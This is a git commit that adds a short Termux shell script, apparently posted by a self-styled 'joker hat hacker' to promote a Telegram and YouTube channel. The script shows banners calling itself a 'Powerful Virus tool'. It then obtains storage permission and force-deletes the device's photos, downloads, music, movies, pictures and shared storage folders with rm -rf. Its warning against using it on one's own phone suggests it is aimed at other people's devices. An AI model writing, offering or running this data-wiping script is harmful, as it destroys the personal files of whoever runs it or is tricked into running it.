c1e1929e2143c55be6f1f27807034087af2f2edc
Joker_hat_hacker_owner <97959909+Jokerhathacker@users.noreply.github.com>
2022-01-19 15:05:13 +0530

    Add files via upload
    This commands for 
    Telegram channel 
    https://telegram.me/joker_hat_hacking

---
+++ Joker viruse simple.sh
@@ -0,0 +1,60 @@
+#! /bin/sh
+# i love you  all
+
+clear
+
+figlet i
+figlet love
+figlet my
+figlet india 
+
+echo Subscribe channel
+
+xdg-open https://youtube.com/channel/UCRZQb4jF6bcNjSYqZDUeYRA
+
+echo script by joker hat hacker
+
+sleep 2
+figlet joker
+figlet hat
+figlet hacker
+sleep 2
+clear
+
+banner()
+{
+  echo "+------------------------------------------+"
+  printf "| %-40s |\n" "`date`"
+  echo "|                                          |"
+  printf "|`tput bold` %-40s `tput sgr0`|\n" "$@"
+  echo "+------------------------------------------+"
+}
+
+banner "Powerful Virus tool dont used this tool your  personal phone "
+
+echo subscribe share
+xdg-open https://youtube.com/channel/UCRZQb4jF6bcNjSYqZDUeYRA
+
+
+
+pkg install figlet
+figlet JOKER 
+figlet VIRUSE
+figlet deleting  photos and music 
+figlet your all
+figlet  photos and music 
+
+termux-setup-storage
+cd storage
+rm -rf dcim 
+rm -rf downloads 
+rm -rf external-1
+rm -rf movies
+rm -rf music
+rm -rf pictures
+rm -rf shared
+cd 
+cd
+xdg-open https://youtube.com/channel/UCRZQb4jF6bcNjSYqZDUeYRA
+
+
